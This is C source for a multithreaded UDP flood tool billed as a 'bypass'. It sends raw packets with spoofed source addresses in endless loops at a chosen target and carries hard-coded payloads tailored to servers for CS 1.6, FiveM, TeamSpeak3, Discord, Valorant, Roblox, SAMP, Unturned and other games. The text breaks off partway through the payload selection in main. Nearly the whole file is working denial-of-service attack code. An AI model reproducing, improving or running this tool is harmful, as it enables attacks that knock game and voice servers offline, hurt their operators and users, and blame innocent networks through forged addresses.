	/*
	=============================================================================
				gcc -oterm -pthread -w udpbypass.c -o udpbypass
							----- No SponneR ------
	=============================================================================
	*/

	#include <pthread.h>
	#include <unistd.h>
	#include <stdio.h>
	#include <stdlib.h>
	#include <string.h>
	#include <sys/socket.h>
	#include <netinet/ip.h>
	#include <netinet/udp.h>

	#define MAX_PACKET_SIZE 4096
	#define PHI 0x9e3779b9


	#include <fcntl.h>
	#include <netinet/tcp.h>
	#include <sys/types.h>
	#include <netinet/in.h>
	#include <netdb.h>
	#define BUFFER_SIZE 1024


	static unsigned int port;
	static unsigned int sport;
	static unsigned int lench;


	char* packetstrx;
	static uint32_t Q[4096], c = 362436;
	struct thread_data { int thread_id; struct list* list_node; struct sockaddr_in sin; };
	volatile int limiter;
	volatile unsigned int pps;
	volatile unsigned int sleeptime = 100;
	int random_classz;
	int random_classzz;
	int randpacket;
	int randpacketz;
	char sip[16];
	char tip[16];
	int s1, s2, s3, s4, s5;
	int t1, t2, t3, t4, t5, t6, t7;

	struct pseudo_header {
		u_int32_t source_address;
		u_int32_t dest_address;
		u_int8_t placeholder;
		u_int8_t protocol;
		u_int16_t udp_length;
	};


void init_rand(unsigned long int x)
{
        int i;
        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;
        for (i = 3; i < 4096; i++){ Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; }
}
unsigned long int rand_cmwc(void)
{
        unsigned long long int t, a = 18782LL;
        static unsigned long int i = 4095;
        unsigned long int x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (t >> 32);
        x = t + c;
        if (x < c) {
        x++;
        c++;
        }
        return (Q[i] = r - x);
}
int randnum(int min_num, int max_num)
{
    int result = 0, low_num = 0, hi_num = 0;

    if (min_num < max_num)
    {
        low_num = min_num;
        hi_num = max_num + 1;
    } else {
        low_num = max_num + 1;
        hi_num = min_num;
    }

    result = (rand_cmwc() % (hi_num - low_num)) + low_num;
    return result;
}

	unsigned short csum(unsigned short* ptr, int nbytes) {
		register long sum;
		unsigned short oddbyte;
		register short answer;

		sum = 0;
		while (nbytes > 1) {
			sum += *ptr++;
			nbytes -= 2;
		}
		if (nbytes == 1) {
			oddbyte = 0;
			*((u_char*)&oddbyte) = *(u_char*)ptr;
			sum += oddbyte;
		}

		sum = (sum >> 16) + (sum & 0xffff);
		sum = sum + (sum >> 16);
		answer = (short)~sum;

		return(answer);
	}

	void* flood(void* par1) {


		int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

		if (s == -1)
		{
			perror("Paket Acilmadi.");
			exit(1);
		}

		char datagram[4096], source_ip[32], classip[32], * data, * pseudogram;
		memset(datagram, 0, 4096);
		struct iphdr* iph = (struct iphdr*) datagram;
		struct udphdr* udph = (struct udphdr*) (datagram + sizeof(struct ip));
		struct sockaddr_in sin;
		struct pseudo_header psh;
		sscanf(sip, "%d.%d.%d.%d/%d", &s1, &s2, &s3, &s4, &s5);
		sscanf(tip, "%d.%d.%d.%d/%d/%d/%d", &t1, &t2, &t3, &t4, &t5, &t6, &t7);

		int i = 0;


		int psize = sizeof(struct pseudo_header) + sizeof(struct udphdr) + lench;

		pseudogram = malloc(psize);

		memcpy((void*)udph + sizeof(struct udphdr), packetstrx, lench);

		iph->ihl = 5;
		iph->version = 4;
		iph->tos = 0;
		iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + lench;
		iph->id = htonl(rand() % 54321);
		iph->frag_off = 0;
		iph->ttl = MAXTTL;
		iph->protocol = 17;
		iph->check = 0;
		int ctos[2] = {0, 20};
        iph->tos = ctos[randnum(0,1)];//we a really important service


		while (1) {

			if ((atoi(sip)) == 0) {

				snprintf(source_ip, sizeof(source_ip) - 1, "%d.%d.%d.%d", rand() % 255, rand() % 255, rand() % 255, rand() % 255);

			}

	if ((atoi(sip)) == 1) {

        random_classz = (rand() % 23) + 1;
    if(random_classz == 1){
        snprintf(source_ip, sizeof(source_ip)-1, "%d.%d.%d.%d", 223, 24, rand()%254, rand()%254);
    }
    if(random_classz == 2){
        snprintf(source_ip, sizeof(source_ip)-1, "%d.%d.%d.%d", 171, 100, rand()%254, rand()%254);
    }
    if(random_classz == 3){
        snprintf(source_ip, sizeof(source_ip)-1, "%d.%d.%d.%d", 124, 121, rand()%254, rand()%254);
    }
    if(random_classz == 4){
        snprintf(source_ip, sizeof(source_ip)-1, "%d.%d.%d.%d", 119, 76, rand()%254, rand()%254);
    }
    if(random_classz == 5){
        snprintf(source_ip, sizeof(source_ip)-1, "%d.%d.%d.%d", 171, 98, rand()%254, rand()%254);
    }
    if(random_classz == 6){
        snprintf(source_ip, sizeof(source_ip)-1, "%d.%d.%d.%d", 119, 46, rand()%254, rand()%254);
    }
    if(random_classz == 7){
        snprintf(source_ip, sizeof(source_ip)-1, "%d.%d.%d.%d", 134, 196, rand()%254, rand()%254);
    }
    if(random_classz == 8){
        snprintf(source_ip, sizeof(source_ip)-1, "%d.%d.%d.%d", 110, 170, rand()%254, rand()%254);
    }
    if(random_classz == 9){
        snprintf(source_ip, sizeof(source_ip)-1, "%d.%d.%d.%d", 58, 11, rand()%254, rand()%254);
    }
    if(random_classz == 10){
        snprintf(source_ip, sizeof(source_ip)-1, "%d.%d.%d.%d", 58, 10, rand()%254, rand()%254);
    }
    if(random_classz == 11){
        snprintf(source_ip, sizeof(source_ip)-1, "%d.%d.%d.%d", 114, 109, rand()%254, rand()%254);
    }
    if(random_classz == 12){
        snprintf(source_ip, sizeof(source_ip)-1, "%d.%d.%d.%d", 182, 17, rand()%254, rand()%254);
    }
    if(random_classz == 13){
        snprintf(source_ip, sizeof(source_ip)-1, "%d.%d.%d.%d", 27, 145, rand()%254, rand()%254);
    }
    if(random_classz == 14){
        snprintf(source_ip, sizeof(source_ip)-1, "%d.%d.%d.%d", 58, 9, rand()%254, rand()%254);
    }
    if(random_classz == 15){
        snprintf(source_ip, sizeof(source_ip)-1, "%d.%d.%d.%d", 58, 8, rand()%254, rand()%254);
    }
    if(random_classz == 16){
        snprintf(source_ip, sizeof(source_ip)-1, "%d.%d.%d.%d", 27, 55, rand()%254, rand()%254);
    }
    if(random_classz == 17){
        snprintf(source_ip, sizeof(source_ip)-1, "%d.%d.%d.%d", 171, 97, rand()%254, rand()%254);
    }
    if(random_classz == 18){
        snprintf(source_ip, sizeof(source_ip)-1, "%d.%d.%d.%d", 171, 101, rand()%254, rand()%254);
    }
    if(random_classz == 19){
        snprintf(source_ip, sizeof(source_ip)-1, "%d.%d.%d.%d", 124, 122, rand()%254, rand()%254);
    }
    if(random_classz == 20){
        snprintf(source_ip, sizeof(source_ip)-1, "%d.%d.%d.%d", 49, 237, rand()%254, rand()%254);
    }
    if(random_classz == 21){
        snprintf(source_ip, sizeof(source_ip)-1, "%d.%d.%d.%d", 171, 96, rand()%254, rand()%254);
    }
    if(random_classz == 22){
        snprintf(source_ip, sizeof(source_ip)-1, "%d.%d.%d.%d", 171, 103, rand()%254, rand()%254);
    }
    if(random_classz == 23){
        snprintf(source_ip, sizeof(source_ip)-1, "%d.%d.%d.%d", 171, 102, rand()%254, rand()%254);
    }

	if ((atoi(sip)) == 2) {

    random_classz = (rand() % 9) + 1;
    if(random_classz == 1){
        snprintf(source_ip, sizeof(source_ip)-1, "%d.%d.%d.%d", 102, 129, 139, rand() % 255);
    }
    if(random_classz == 2){
        snprintf(source_ip, sizeof(source_ip)-1, "%d.%d.%d.%d", 102, 129, 138, rand() % 255);
    }
    if(random_classz == 3){
        snprintf(source_ip, sizeof(source_ip)-1, "%d.%d.%d.%d", 103, 174, 190, rand() % 255);
    }
    if(random_classz == 4){
        snprintf(source_ip, sizeof(source_ip)-1, "%d.%d.%d.%d", 103, 174, 191, rand() % 255);
    }
    if(random_classz == 5){
        snprintf(source_ip, sizeof(source_ip)-1, "%d.%d.%d.%d", 154, 84, 153, rand() % 255);
    }
    if(random_classz == 6){
        snprintf(source_ip, sizeof(source_ip)-1, "%d.%d.%d.%d", 154, 208, 140, rand() % 255);
    }
    if(random_classz == 7){
        snprintf(source_ip, sizeof(source_ip)-1, "%d.%d.%d.%d", 154, 212, 139, rand() % 255);
    }
    if(random_classz == 8){
        snprintf(source_ip, sizeof(source_ip)-1, "%d.%d.%d.%d", 154, 215, 14, rand() % 255);
    }
    if(random_classz == 9){
        snprintf(source_ip, sizeof(source_ip)-1, "%d.%d.%d.%d", 156, 233, 27, rand() % 255);
    }

			if ((atoi(sip)) == 0) {

				snprintf(source_ip, sizeof(source_ip) - 1, "%d.%d.%d.%d", rand() % 255, rand() % 255, rand() % 255, rand() % 255);

			}

			}

			else {

				if (s5 == 32) {

					snprintf(source_ip, sizeof(source_ip) - 1, "%d.%d.%d.%d", s1, s2, s3, s4);

				}

				if (s5 == 24) {

					snprintf(source_ip, sizeof(source_ip) - 1, "%d.%d.%d.%d", s1, s2, s3, rand() % 255);

				}

				if (s5 == 16) {

					snprintf(source_ip, sizeof(source_ip) - 1, "%d.%d.%d.%d", s1, s2, rand() % 255, rand() % 255);

				}

				if (s5 == 8) {

					snprintf(source_ip, sizeof(source_ip) - 1, "%d.%d.%d.%d", s1, rand() % 255, rand() % 255, rand() % 255);

				}

			}
	}

			sin.sin_family = AF_INET;
			sin.sin_port = htons(80);


			if (t5 == 24) {

				snprintf(classip, sizeof(classip) - 1, "%d.%d.%d.%d", t1, t2, t3, rand() % (t7 + 1 - t6) + t6);
				sin.sin_addr.s_addr = inet_addr(classip);

			}
			else {
				sin.sin_addr.s_addr = inet_addr(tip);
			}

			iph->saddr = inet_addr(source_ip);
			iph->daddr = sin.sin_addr.s_addr;
			iph->check = csum((unsigned short*)datagram, iph->tot_len);
			if (sport == 0) { udph->source = htons(15000 + rand() % 45000); }
			else { udph->source = sport; }
			if (port == 0) { udph->dest = htons(1 + rand() % 15000); }
			else { udph->dest = port; }
			udph->len = htons(sizeof(struct udphdr) + lench);
			udph->check = 0;
			psh.source_address = inet_addr(source_ip);
			psh.dest_address = sin.sin_addr.s_addr;
			psh.placeholder = 0;
			psh.protocol = IPPROTO_UDP;
			psh.udp_length = htons(sizeof(struct udphdr) + lench);
			memcpy(pseudogram, (char*)&psh, sizeof(struct pseudo_header));
			memcpy(pseudogram + sizeof(struct pseudo_header), udph, sizeof(struct udphdr) + lench);
			udph->check = csum((unsigned short*)pseudogram, psize);
			sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & sin, sizeof(sin));
			pps++;
			if (i >= limiter) {
				i = 0;
				usleep(1700);
			}
			i++;
		}
	}


	int main(int argc, char* argv[]) {
		if (argc < 8) {
			fprintf(stdout, "?\n");
			fprintf(stdout, "udpbypass Mod by akanine\n");
			fprintf(stdout, "Usage: %s <Target> <DST PORT/0 FOR RANDOM> <SRC PORT/0 FOR RANDOM> <127.0.0.1/32 / 0 FOR RANDOM / 1 FOR THAILAND IP / 2 FOR INTER> <THREAD> <PPS LIMIT, -1 NO LIMIT> <valorant,cs16,fivem,fivem2,fivem3,gmod,csgo,ts3,amongus,source,roblox,samp,unturned,rov,overwatch,hsh,ts3v2> <TIME> \n", argv[0]);
			exit(-1);
		}
		int i = 0;
		int max_len = 128;
		char* buffer = (char*)malloc(max_len);
		buffer = memset(buffer, 0x00, max_len);
		int num_threads = atoi(argv[5]);
		int maxpps = atoi(argv[6]);
		limiter = 0;
		pps = 0;
		int multiplier = 20;
		pthread_t thread[num_threads];
		struct thread_data td[num_threads];
		port = htons(atoi(argv[2]));
		sport = htons(atoi(argv[3]));
		strcpy(tip, argv[1]);
		strcpy(sip, argv[4]);
		char* oyun = argv[7];

		if (strcmp(oyun, "cs16") == 0) {
			fprintf(stdout, "COUNTER-STRIKE 1.6\n");
			lench = 23;
			packetstrx = malloc(lench);
			memset(packetstrx, 0x00, lench);
			packetstrx = "\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x73\x74\x65\x61\x6d\x0a";
		}

		if (strcmp(oyun, "fivem") == 0) {
			fprintf(stdout, "FIVEM GETINFO (GTA5)\n");
			lench = 15;
			packetstrx = malloc(lench);
			memset(packetstrx, 0x00, lench);
			packetstrx = "\xff\xff\xff\xff\x67\x65\x74\x69\x6e\x66\x6f\x20\x78\x78\x78";
		}
		if (strcmp(oyun, "fivem2") == 0) {
		fprintf(stdout, "FIVEM GETSTATUS (GTA5)\n");
                randpacket = 0;
				randpacket = (rand() % 3) + 1;
                 if(randpacket == 1 ){
				lench = 15;
				packetstrx = malloc(lench);
				memset(packetstrx, 0x00, lench);
				packetstrx = "\xff\xff\xff\xff\x67\x65\x74\x69\x6e\x66\x6f\x20\x78\x78\x78";
        }
                 if(randpacket == 2 ){
				lench = 13;
				packetstrx = malloc(lench);
				memset(packetstrx, 0x00, lench);
				packetstrx = "\xff\xff\xff\xff\x67\x65\x74\x73\x74\x61\x74\x75\x73";
        }
                 if(randpacket == 3 ){
				lench = 65;
				packetstrx = malloc(lench);
				memset(packetstrx, 0x00, lench);
				packetstrx = "\x74\x6f\x6b\x65\x6e\x3d\x64\x66\x39\x36\x61\x66\x30\x33\x2d\x63\x32\x66\x63\x2d\x34\x63\x32\x39\x2d\x39\x31\x39\x61\x2d\x32\x36\x30\x35\x61\x61\x37\x30\x62\x31\x66\x38\x26\x67\x75\x69\x64\x3d\x37\x36\x35\x36\x31\x31\x39\x38\x38\x30\x34\x38\x30\x36\x30\x31\x35";
        }
		}
		if (strcmp(oyun, "fivem3") == 0) {
			fprintf(stdout, "Fivem-New\n");
			lench = 65;
			packetstrx = malloc(lench);
			memset(packetstrx, 0x00, lench);
			packetstrx = "\x74\x6f\x6b\x65\x6e\x3d\x64\x66\x39\x36\x61\x66\x30\x33\x2d\x63\x32\x66\x63\x2d\x34\x63\x32\x39\x2d\x39\x31\x39\x61\x2d\x32\x36\x30\x35\x61\x61\x37\x30\x62\x31\x66\x38\x26\x67\x75\x69\x64\x3d\x37\x36\x35\x36\x31\x31\x39\x38\x38\x30\x34\x38\x30\x36\x30\x31\x35";
		}

		if (strcmp(oyun, "gmod") == 0) {
			fprintf(stdout, "Garrys Mod\n");
			lench = 23;
			packetstrx = malloc(lench);
			memset(packetstrx, 0x00, lench);
			packetstrx = "\xff\xff\xff\xff\x71\x96\x9e\x53\x05\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x00";
		}

		if (strcmp(oyun, "csgo") == 0) {
			fprintf(stdout, "CS-GO\n");
			lench = 23;
			packetstrx = malloc(lench);
			memset(packetstrx, 0x00, lench);
			packetstrx = "\xff\xff\xff\xff\x71\x63\x6f\x6e\x6e\x65\x63\x74\x30\x78\x30\x30\x30\x30\x30\x30\x30\x30\x00";
		}

		if (strcmp(oyun, "ts3") == 0) {
			fprintf(stdout, "TEAMSPEAK3\n");
			lench = 34;
			packetstrx = malloc(lench);
			memset(packetstrx, 0x00, lench);
			packetstrx = "\x54\x53\x33\x49\x4e\x49\x54\x31\x00\x65\x00\x00\x88\x0a\x39\x7b\x0f\x00\x62\x18\xfa\xa2\xa4\x98\x74\xf9\x00\x00\x00\x00\x00\x00\x00\x00";
		}

		if (strcmp(oyun, "ts3v1") == 0) {
			fprintf(stdout, "TEAMSPEAK3v1\n");
			lench = 38;
			packetstrx = malloc(lench);
			memset(packetstrx, 0x00, lench);
			packetstrx = "\x54\x53\x33\x49\x4e\x49\x54\x31\x00\x65\x00\x00\x88\x0a\x39\x7b\x0f\x02\x7d\x6c\xe6\x30\x4c\x96\xa6\x3a\x56\xb1\x69\xe4\xef\xc6\x76\xd3\xf9\x74\x98\xa4";
		}

		if (strcmp(oyun, "amongus") == 0) {
			fprintf(stdout, "Among Us\n");
			lench = 13;
			packetstrx = malloc(lench);
			memset(packetstrx, 0x00, lench);
			packetstrx = "\xe3\x54\x0a\x4f\x6e\x6c\x69\x6e\x65\x47\x61\x6d\x65";
		}

		if (strcmp(oyun, "source") == 0) {
			fprintf(stdout, "TSource Engine\n");
			lench = 25;
			packetstrx = malloc(lench);
			memset(packetstrx, 0x00, lench);
			packetstrx = "\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00";
		}
		
		if (strcmp(oyun, "discord1") == 0) {
			fprintf(stdout, "Discord1\n");
			lench = 8;
			packetstrx = malloc(lench);
			memset(packetstrx, 0x00, lench);
			packetstrx = "\x13\x37\xca\xfe\x01\x00\x00\x00";
		}
		
		if (strcmp(oyun, "discord2") == 0) {
			fprintf(stdout, "Discord2\n");
			lench = 74;
			packetstrx = malloc(lench);
			memset(packetstrx, 0x00, lench);
			packetstrx = "\x00\x01\x00\x46\x00\x13\x8b\x81\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x35\x57";
		}
		
		if (strcmp(oyun, "discord3") == 0) {
			fprintf(stdout, "Discord3\n");
			lench = 74;
			packetstrx = malloc(lench);
			memset(packetstrx, 0x00, lench);
			packetstrx = "\x00\x01\x00\x46\x00\x13\x8b\x81\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\xcf";
		}	

		if (strcmp(oyun, "discord4") == 0) {
			fprintf(stdout, "Discord Random\n");
			randpacketz = randnum(0, 7);
                 if(randpacketz == 1 ){
				fprintf(stdout, "Discord1\n");
				lench = 8;
				packetstrx = malloc(lench);
				memset(packetstrx, 0x00, lench);
				packetstrx = "\x02\x00\x00\x00\x00\x00\x00\x00";
        }
                 if(randpacketz == 2 ){
				fprintf(stdout, "Discord2\n");
				lench = 8;
				packetstrx = malloc(lench);
				memset(packetstrx, 0x00, lench);
				packetstrx = "\x01\x00\x00\x00\x00\x00\x00\x00";
        }
                 if(randpacketz == 3 ){
				fprintf(stdout, "Discord3\n");
				lench = 9;
				packetstrx = malloc(lench);
				memset(packetstrx, 0x00, lench);
				packetstrx = "\xff\x10\x00\x3c\x26\x80\x00\x03\x7b";
        }
                 if(randpacketz == 4 ){
				fprintf(stdout, "Discord4\n");
				lench = 74;
				packetstrx = malloc(lench);
				memset(packetstrx, 0x00, lench);
				packetstrx = "\x00\x02\x00\x42\x00\x01\xB3\xE7\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x34\x42";
        }
                 if(randpacketz == 5 ){
				fprintf(stdout, "Discord5\n");
				lench = 74;
				packetstrx = malloc(lench);
				memset(packetstrx, 0x00, lench);
				packetstrx = "\x00\x02\x00\x42\x00\x01\xC5\x6D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
        }
                 if(randpacketz == 6 ){
				fprintf(stdout, "Discord6\n");
				lench = 31;
				packetstrx = malloc(lench);
				memset(packetstrx, 0x00, lench);
				packetstrx = "\x00\x3e\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x05\x73\x79\x63\x65\x72\x07\x6e\x65\x74\x77\x6f\x72\x6b\x00\x00\xff\x00\x01";
        }
                 if(randpacketz == 7 ){
				fprintf(stdout, "Discord7\n");
				lench = 65;
				packetstrx = malloc(lench);
				memset(packetstrx, 0x00, lench);
				packetstrx = "\xc2\x43\xc6\x5e\x00\x57\x5f\x2f\x00\x01\x00\x46\x00\x00\x54\xc6\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
        }
		}

		if (strcmp(oyun, "valorant") == 0) {
			fprintf(stdout, "valorant\n");
			lench = 320;
			packetstrx = malloc(lench);
			memset(packetstrx, 0x00, lench);
			packetstrx = "\xC5\x6A\x1C\xFD\x01\x40\x52\xD3\x17\xE1\x14\xD2\x0E\x32\x4F\xCB\xF6\x74\x46\x94\x72\xCA\x3A\x03\xE4\xF1\xA2\x16\x67\x30\xC0\x07\x1F\xEC\x31\xBF\x58\x04\xC3\x39\x6F\xA7\x71\x04\x15\x3A\x9E\x78\x9D\xF6\x0C\x80\x62\x09\x80\x4F\xCA\x56\x2E\x53\x75\x60\x65\x77\x19\xFF\x9C\xC6\xC2\x3B\xCE\x4B\x99\xB4\xBA\x86\xB5\x34\x47\x43\xE6\xAA\x7F\xBD\x01\xDD\xF0\x49\xE0\x37\xAE\x99\xEC\x94\xEC\x9A\x2A\x23\x7C\xA2\x42\x9C\x66\x07\x0B\x42\x46\x27\xB3\x24\x75\x4B\xC6\x4D\x86\x24\x2F\xC6\xCD\x64\x3E\x7E\x83\xC9\xF4\x46\x8D\x34\xA4\x1A\x71\x39\xE6\x12\x7D\x80\xE5\x0E\x72\xD5\x04\xD5\x0E\x93\x25\x0F\xD5\xE9\x5A\x23\x3C\xCC\x41\x77\xC6\xC8\x4C\xB9\xC7\xC5\x8C\x73\x77\xAC\x09\x04\x34\xB8\x34\x13\xBB\x4C\x07\x7D\x8E\x21\x52\xC7\xAE\x5C\xD6\x48\x87\xFD\x47\x2B\x93\xE0\x6C\x4C\x8A\x60\xD5\x16\x66\x61\x76\x38\x7B\x93\xAD\x8B\x50\xEB\x57\xB1\x1D\xF3\x39\xB0\x21\x80\xD1\xCF\x38\xD6\x90\x9F\x7B\x0A\xC0\x9F\xF2\xEF\xAE\x7E\x47\x9C\x95\x45\xB5\xDC\x47\xA0\x2C\x89\x6B\x69\x9D\xBF\x76\x8A\xC0\xF7\xF2\x68\xF8\xF3\xC2\x78\x88\xE0\x87\x41\x7D\x16\xB1\x37\xB9\x00\xB7\x33\x08\x56\x90\x83\x38\x1F\x97\xC1\xE3\x8A\x51\x37\x8F\x35\x0F\x62\x26\xE1\x2F\xEC\x42\xA8\xD3\x4C\x0D\x1A\xF1\x73\x5C\x74\x76\xD1\x07\x48\x85\x0C\xFB\x23\x16\xAE\x48\x3E\xDE\xB2\x47\x9F\x35\xA8\x43\xAF\xBF\x49\x3F\x48\xFE\x24\x29\x0F";
		}
		
			if (strcmp(oyun, "roblox") == 0) {
			fprintf(stdout, "roblox\n");
			lench = 25;
			packetstrx = malloc(lench);
			memset(packetstrx, 0x00, lench);
			packetstrx = "\x01\x00\x00\x00\x00\x03\x6b\xe1\x22\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78"; // nice packet
		}
			if (strcmp(oyun, "roblox2") == 0) {
			fprintf(stdout, "roblox2\n");
			lench = 30;
			packetstrx = malloc(lench);
			memset(packetstrx, 0x00, lench);
			packetstrx = "\x8e\x8d\x22\xca\x93\xec\xa1\x21\x30\xf3\x7c\xf7\x7b\x6e\x57\x6d\x79\xce\x31\xd7\x5b\x26\x2e\x9e\xbb\x23\x21\x02\x28\xb5"; // idk shit
		}
		if (strcmp(oyun, "samp") == 0) {
			fprintf(stdout, "samp Random\n");
			randpacketz = 1;
            	if(randpacketz == 1 ) {
					fprintf(stdout, "samp1\n");
					lench = 4;
					packetstrx = malloc(lench);
					memset(packetstrx, 0x00, lench);
					packetstrx = "\x53\x41\x4d\x50";
					randpacketz == 2;
        		} if(randpacketz == 2 ) {
					fprintf(stdout, "samp2\n");
					lench = 6;
					packetstrx = malloc(lench);
					memset(packetstrx, 0x00, lench);
					packetstrx = "\x0A\xE7\x44\x69\x0B\x69";
					randpacketz == 3;
        		} if(randpacketz == 3 ) {
					fprintf(stdout, "samp3\n");
					lench = 24;
					packetstrx = malloc(lench);
					memset(packetstrx, 0x00, lench);
					packetstrx = "\x20\x30\x8A\xBC\x18\xAD\x8A\x27\x8A\x27\x8A\x27\x8A\x27\xC1\xA5\x8A\x27\xC1\xA5\x8A\x27\xC1\xA5";
        		}
		}

			if (strcmp(oyun, "unturned") == 0) {
			fprintf(stdout, "unturned\n");
			lench = 332;
			packetstrx = malloc(lench);
			memset(packetstrx, 0x00, lench);
			packetstrx = "\x22\x0d\x23\x7a\xbd\x49\x11\xde\xfe\x60\xd3\x33\xb6\x83\x5c\x19\x41\x19\x19\x00\x01\x00\x10\x01\x22\xaf\x01\x22\x62\x08\x01\x12\x20\xb1\x11\xa0\x05\xc7\x1c\xdf\x9d\x2a\x93\xa1\xda\xfd\xef\x92\x17\xd8\xb7\x45\x77\xa7\xc1\x82\xf1\xfc\xe1\xd6\x6c\x2a\x6a\xd0\xed\x21\x41\x19\x19\x00\x01\x00\x10\x01\x45\x2d\x01\x22\x63\x4d\x2d\xa4\x24\x63\x50\xa2\xce\x12\x5a\x0a\x81\x01\x41\x19\x19\x00\x01\x00\x10\x01\x62\x19\x73\x74\x65\x61\x6d\x69\x64\x3a\x31\x32\x33\x34\x35\x36\x37\x38\x39\x32\x33\x39\x31\x30\x35\x39\x33\x29\x3e\xad\x7c\x92\x2f\x8a\xdc\xfc\x32\x40\xa5\x51\x2a\x4f\x7a\xec\x31\xee\x88\x69\x9a\x21\x49\xc9\x17\x71\xef\x4f\xf7\x5b\x99\x36\x8f\xe2\x0a\xb0\xf1\x22\x0a\x27\x49\xea\xf0\x4f\xf9\x7c\xd9\xe5\x25\x8d\xad\xd7\x58\xa9\x45\xcc\xb5\xb4\x1e\xbb\x71\x62\xfc\xfd\x88\x6d\xcb\xd8\x0f\x79\xf3\x09\x5b\x0f\x29\x6d\xd5\x98\x89\xba\x02\x00\x00\x30\x14\x3a\x75\x0a\x31\x08\x01\x12\x20\x6e\x72\xd2\xec\xe9\x6b\xf5\x55\x3a\x60\x2b\x3e\x5b\x39\x8c\x8a\x5e\xfe\xe1\xe1\x2d\xa0\x9d\x0e\x6c\xa1\x99\x0d\x53\x5f\x9f\x44\x19\x35\xe0\x3c\xe8\x2f\x94\x75\x65\x20\x0b\x28\x02\x12\x40\xb4\xad\x95\xba\x52\x99\x93\xc7\xbe\xe9\x87\x49\x23\x5c\xbc\xd4\x66\xb0\x37\x90\x8e\xd9\xec\xd0\x3d\x74\x4f\x5a\xca\x92\x92\xf2\x16\xfc\x5d\x7e\x1a\xaf\x1b\xd6\xce\xc7\x01\x97\x90\xa9\xab\xc7\xa8\xbf\x61\xe8\x1e\x5c\x44\x5d\x5f\x27\xc2\x2e\xd3\xc6\x61\x0a";
		}

			if (strcmp(oyun, "overwatch") == 0) {
			fprintf(stdout, "overwatch\n");
			lench = 46;
			packetstrx = malloc(lench);
			memset(packetstrx, 0x00, lench);
			packetstrx = "\x39\x0c\x8c\x0a\x13\xba\x8f\xe8\x7a\xfb\x74\x0a\x31\x08\xa0\x97\x03\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\xad\x6f\xfd\x18\x8d\x58\x76\x5e\xa7\x09\x85\xa0\x0e";
		}

			if (strcmp(oyun, "hsh") == 0) {
			fprintf(stdout, "hsh\n");
			lench = 29;
			packetstrx = malloc(lench);
			memset(packetstrx, 0x00, lench);
			packetstrx = "\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08";
		}

			if (strcmp(oyun, "ts3v2") == 0) {
			fprintf(stdout, "ts3v2\n");
			lench = 34;
			packetstrx = malloc(lench);
			memset(packetstrx, 0x00, lench);
			packetstrx = "\x54\x53\x33\x49\x4E\x49\x54\x31\x00\x65\x00\x00\x88\x0A\x39\x7B\x0F\x00\x63\x70\xA2\x59\xA2\xB1\xE7\x26\x00\x00\x00\x00\x00\x00\x00\x00";
		}

		
		if (strcmp(oyun, "285rrr") ==0) {
			fprintf(stdout, "285rrr\n");
			lench = 34;
			packetstrx = malloc(lench);
			memset(packetstrx, 0x00, lench);
			packetstrx = "\x54\x53\x33\x49\x4E\x49\x54\x31\x00\x65\x00\x00\x88\x0A\x39\x7B\x0F\x00\x63\xB6\xC0\x97\xB2\xBE\x75\x0F\x00\x00\x00\x00\x00\x00\x00\x00";
		}
				
		if (strcmp(oyun, "9king") ==0) {
			fprintf(stdout, "9king\n");
			lench = 34;
			packetstrx = malloc(lench);
			memset(packetstrx, 0x00, lench);
			packetstrx = "\x54\x53\x33\x49\x4E\x49\x54\x31\x00\x65\x00\x00\x88\x0A\x39\x7B\x0F\x00\x63\xBE\xFD\xD3\x46\x3E\xFF\xF4\x00\x00\x00\x00\x00\x00\x00\x00";
		}
						
		if (strcmp(oyun, "pb") ==0) {
			fprintf(stdout, "point blank\n");
			lench = 74;
			packetstrx = malloc(lench);
			memset(packetstrx, 0x00, lench);
